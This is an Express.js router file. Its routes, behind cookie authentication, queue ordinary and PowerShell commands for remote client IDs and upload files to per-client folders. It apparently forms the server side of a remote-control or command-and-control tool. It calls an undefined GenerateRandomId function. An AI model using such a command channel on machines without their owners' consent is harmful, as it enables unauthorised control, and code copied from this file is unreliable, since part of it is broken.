const router = require('express').Router();
let Command = require('../commands.model');
let webCookieValidator = require('../../Utils/MiddleWears/webCookieValidator');
const psCommand = require('../pscommand.model');
const formidable = require('express-formidable');
const Utils = require('../../Utils/utilFunctions')
const ClientUtils = require('../../Utils/clientUtils')
//Middle wear for authentication
router.use(webCookieValidator);

//Add regular command
router.route('/add').post((req, res) => {
    const clientId = req.body.client_id;
    const command = req.body.command;
    ClientUtils.AddCommand(clientId, command).then(() => res.send()).catch(() => res.sendStatus(500))
});


//Add powershell command
router.route('/ps/add').post((req, res) => {
    const commandId = GenerateRandomId(6);
    const clientId = req.headers['clientid'];
    const command = req.body.command;
    const newPsCommand = new psCommand({command_id: commandId, client_id: clientId, command: command});

    newPsCommand.save()
        .then(() => res.send())
        .catch(err => {
            Utils.LogToFile(`Error adding powershell command to database ${err}`);
            res.sendStatus(500);
        })
});

router.use(formidable())

//Upload file to directory
router.route('/upload').post((req, res) => {
    console.log(req.headers)
    Utils.MoveFile(req.files.file.path, req.files.file.name, req.headers['client_id'])
    res.send()
})

module.exports = router;

